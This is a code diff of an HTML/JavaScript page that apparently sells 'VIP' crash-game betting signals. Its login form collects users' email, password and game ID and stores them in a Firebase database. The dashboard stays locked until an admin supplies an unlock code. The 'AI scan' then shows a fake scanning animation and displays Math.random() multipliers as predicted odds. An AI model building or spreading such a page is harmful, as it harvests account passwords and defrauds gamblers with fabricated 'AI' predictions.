@@ -18,13 +18,14 @@
         
         /* Signal UI */
         .signal-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 20px; }
-        .sig-card { background: linear-gradient(145deg, #0d1b2a, #08121d); padding: 20px; border-radius: 20px; border: 1px solid rgba(0, 242, 255, 0.1); position: relative; overflow: hidden; }
+        .sig-card { background: linear-gradient(145deg, #0d1b2a, #08121d); padding: 20px; border-radius: 20px; border: 1px solid rgba(0, 242, 255, 0.1); position: relative; overflow: hidden; min-height: 80px; }
         .scanner-bar { position: absolute; width: 100%; height: 3px; background: var(--accent); left: 0; top: 0; animation: scanLine 2s linear infinite; display: none; }
         @keyframes scanLine { 0% { top: 0; } 100% { top: 100%; } }
         .digi-odds { font-family: 'Share Tech Mono'; font-size: 28px; color: #fff; }
         .sig-time { color: var(--gold); font-size: 14px; margin-bottom: 5px; }
 
         .btn { width: 100%; padding: 18px; border-radius: 15px; border: none; font-family: 'Orbitron'; font-weight: 700; cursor: pointer; margin-top: 15px; transition: 0.3s; }
+        .btn:active { transform: scale(0.98); }
         .btn-main { background: var(--accent); color: black; }
         .btn-copy { background: transparent; border: 1px solid var(--accent); color: var(--accent); display: none; }
         .btn-back { background: transparent; color: #888; border: 1px solid #333; font-size: 11px; margin-top: 20px; padding: 10px; }
@@ -48,7 +49,7 @@
     <h2 style="color: var(--locked-red);">DEVICE LOCKED 🛡️</h2>
     <p style="font-size: 13px; color: #888;">Copy ID & get your Code from Admin</p>
     <div class="device-id-container">
-        <span id="display-device-id">PV-LOADING...</span>
+        <span id="display-device-id">LOADING...</span>
         <button style="background:var(--locked-red); color:white; border:none; padding:5px 10px; border-radius:5px; cursor:pointer;" onclick="copyDeviceID()">COPY</button>
     </div>
     <input type="text" id="unlock-input" class="input-box" placeholder="ENTER UNLOCK CODE">
@@ -58,12 +59,12 @@
 
 <div id="dashboard" class="container">
     <h2 style="font-size: 14px;">PV VIP CONTROL PANEL</h2>
-    <input type="number" id="peak-input" class="input-box" style="width: 140px;" placeholder="0.00">
+    <input type="number" id="peak-input" class="input-box" style="width: 140px;" placeholder="PEAK">
     <div class="signal-grid">
-        <div class="sig-card"><div class="scanner-bar"></div><div id="t1" class="sig-time">--:--</div><div id="o1" class="digi-odds">0.00x</div></div>
-        <div class="sig-card"><div class="scanner-bar"></div><div id="t2" class="sig-time">--:--</div><div id="o2" class="digi-odds">0.00x</div></div>
-        <div class="sig-card"><div class="scanner-bar"></div><div id="t3" class="sig-time">--:--</div><div id="o3" class="digi-odds">0.00x</div></div>
-        <div class="sig-card"><div class="scanner-bar"></div><div id="t4" class="sig-time">--:--</div><div id="o4" class="digi-odds">0.00x</div></div>
+        <div class="sig-card"><div class="scanner-bar" id="b1"></div><div id="t1" class="sig-time">--:--</div><div id="o1" class="digi-odds">0.00x</div></div>
+        <div class="sig-card"><div class="scanner-bar" id="b2"></div><div id="t2" class="sig-time">--:--</div><div id="o2" class="digi-odds">0.00x</div></div>
+        <div class="sig-card"><div class="scanner-bar" id="b3"></div><div id="t3" class="sig-time">--:--</div><div id="o3" class="digi-odds">0.00x</div></div>
+        <div class="sig-card"><div class="scanner-bar" id="b4"></div><div id="t4" class="sig-time">--:--</div><div id="o4" class="digi-odds">0.00x</div></div>
     </div>
     <button class="btn btn-main" id="scan-btn" onclick="runAIScan()">GENERATE SIGNALS</button>
     <button class="btn btn-copy" id="copy-btn" onclick="copyAllSignals()">COPY ALL SIGNALS</button>
@@ -81,33 +82,37 @@
         storageBucket: "prakash-academy-8a60d.firebasestorage.app",
         messagingSenderId: "13529868262",
         appId: "1:13529868262:web:4e2c17fc10e9189c085827",
-        databaseURL: "https://prakash-academy-8a60d-default-rtdb.firebaseio.com/" // ඔබේ Database URL එක මෙතනට දාන්න
+        databaseURL: "https://prakash-academy-8a60d-default-rtdb.firebaseio.com/"
     };
 
     firebase.initializeApp(firebaseConfig);
     const database = firebase.database();
 
+    // App Startup Logic
     window.onload = function() {
-        const savedUser = localStorage.getItem("pv_user_id");
+        const savedDevId = localStorage.getItem("pv_user_id");
         const isUnlocked = localStorage.getItem("pv_unlocked");
 
         if (isUnlocked === "true") {
             showDashboard();
-        } else if (savedUser) {
-            showLockScreen(savedUser);
+        } else if (savedDevId) {
+            showLockScreen(savedDevId);
         } else {
             document.getElementById("auth-screen").style.display = "block";
         }
     };
 
+    // 1. Login Function
     function handleLogin() {
         const email = document.getElementById('email').value;
         const pass = document.getElementById('pass').value;
         const gid = document.getElementById('gameid').value;
 
-        if(!email || !pass || !gid) return alert("කරුණාකර සියලු විස්තර ඇතුළත් කරන්න!");
+        if(!email || !pass || !gid) {
+            alert("Fill all details!");
+            return;
+        }
 
-        // Device ID එකක් සෑදීම
         const devId = "PV-" + Math.random().toString(36).substr(2, 5).toUpperCase() + "-" + Math.floor(1000 + Math.random() * 9000);
         
         const userData = {
@@ -116,54 +121,66 @@
             gameId: gid,
             deviceId: devId,
             unlockCode: "PENDING",
-            status: "LOCKED"
+            timestamp: Date.now()
         };
 
-        // Firebase වෙත දත්ත යැවීම
-        database.ref('users/' + devId).set(userData).then(() => {
-            localStorage.setItem("pv_user_id", devId);
-            showLockScreen(devId);
-        });
+        database.ref('users/' + devId).set(userData)
+            .then(() => {
+                localStorage.setItem("pv_user_id", devId);
+                showLockScreen(devId);
+            })
+            .catch(err => alert("Error: " + err.message));
     }
 
+    // 2. Unlock Function
     function handleUnlock() {
         const inputCode = document.getElementById('unlock-input').value;
         const devId = localStorage.getItem("pv_user_id");
 
-        if(!inputCode) return alert("කේතය ඇතුළත් කරන්න!");
+        if(!inputCode) return alert("Enter Code!");
 
-        // Firebase එකෙන් Code එක පරීක්ෂා කිරීම
         database.ref('users/' + devId).once('value').then((snapshot) => {
             const data = snapshot.val();
-            if (data && data.unlockCode === inputCode) {
+            if (data && data.unlockCode === inputCode && inputCode !== "PENDING") {
                 localStorage.setItem("pv_unlocked", "true");
                 showDashboard();
             } else {
-                alert("වැරදි කේතයකි! කරුණාකර Admin සම්බන්ධ කරගන්න.");
+                alert("වැරදි කේතයකි! Admin සම්බන්ධ කරගන්න.");
             }
         });
     }
 
+    // 3. AI Scan Function
     function runAIScan() {
-        if(!document.getElementById('peak-input').value) return alert("Enter Peak!");
-        document.querySelectorAll('.scanner-bar').forEach(b => b.style.display='block');
+        const peak = document.getElementById('peak-input').value;
+        if(!peak) return alert("Enter Peak Value!");
+
+        document.querySelectorAll('.scanner-bar').forEach(b => b.style.display = 'block');
+        const scanBtn = document.getElementById('scan-btn');
+        scanBtn.innerText = "SCANNING...";
+        scanBtn.disabled = true;
+
         setTimeout(() => {
+            const now = new Date();
             for(let i=1; i<=4; i++) {
-                document.getElementById(`t${i}`).innerText = new Date().getHours() + ":" + (new Date().getMinutes() + i*4);
-                document.getElementById(`o${i}`).innerText = (Math.random() * 6 + 2).toFixed(2) + "x";
+                let futureMin = now.getMinutes() + (i * 3);
+                let hour = now.getHours();
+                if(futureMin >= 60) { futureMin -= 60; hour += 1; }
+                
+                const timeStr = hour.toString().padStart(2, '0') + ":" + futureMin.toString().padStart(2, '0');
+                const odds = (Math.random() * 5 + 1.5).toFixed(2);
+                
+                document.getElementById(`t${i}`).innerText = timeStr;
+                document.getElementById(`o${i}`).innerText = odds + "x";
             }
-            document.querySelectorAll('.scanner-bar').forEach(b => b.style.display='none');
+            document.querySelectorAll('.scanner-bar').forEach(b => b.style.display = 'none');
+            scanBtn.innerText = "GENERATE SIGNALS";
+            scanBtn.disabled = false;
             document.getElementById('copy-btn').style.display = 'block';
-        }, 2000);
+        }, 3000);
     }
 
-    function copyAllSignals() {
-        let text = "🎯 PV ACADEMY VIP 🎯\n";
-        for(let i=1; i<=4; i++) { text += `\n${document.getElementById('t'+i).innerText} -> ${document.getElementById('o'+i).innerText}`; }
-        navigator.clipboard.writeText(text);
-        showToast("COPIED!");
-    }
-
+    // Helpers
     function showDashboard() { hideAll(); document.getElementById("dashboard").style.display = "block"; }
     
     function showLockScreen(devId) { 
@@ -172,10 +189,38 @@
         document.getElementById("lock-screen").style.display = "block"; 
     }
 
-    function logout() { localStorage.clear(); location.reload(); }
-    function hideAll() { document.querySelectorAll('.container').forEach(c => c.style.display = 'none'); }
-    function showToast(m) { const t = document.getElementById('toast'); t.innerText = m; t.style.display = 'block'; setTimeout(() => t.style.display = 'none', 2000); }
-    function copyDeviceID() { navigator.clipboard.writeText(document.getElementById("display-device-id").innerText); showToast("ID COPIED!"); }
+    function logout() {
+        if(confirm("Are you sure?")) {
+            localStorage.clear();
+            location.reload();
+        }
+    }
+
+    function hideAll() {
+        document.querySelectorAll('.container').forEach(c => c.style.display = 'none');
+    }
+
+    function showToast(m) {
+        const t = document.getElementById('toast');
+        t.innerText = m;
+        t.style.display = 'block';
+        setTimeout(() => t.style.display = 'none', 2000);
+    }
+
+    function copyDeviceID() {
+        const id = document.getElementById("display-device-id").innerText;
+        navigator.clipboard.writeText(id);
+        showToast("ID COPIED!");
+    }
+
+    function copyAllSignals() {
+        let text = "🎯 PV ACADEMY VIP 🎯\n";
+        for(let i=1; i<=4; i++) { 
+            text += `\n⏰ ${document.getElementById('t'+i).innerText} 👉 ${document.getElementById('o'+i).innerText}`; 
+        }
+        navigator.clipboard.writeText(text);
+        showToast("SIGNALS COPIED!");
+    }
 </script>
 </body>
 </html>
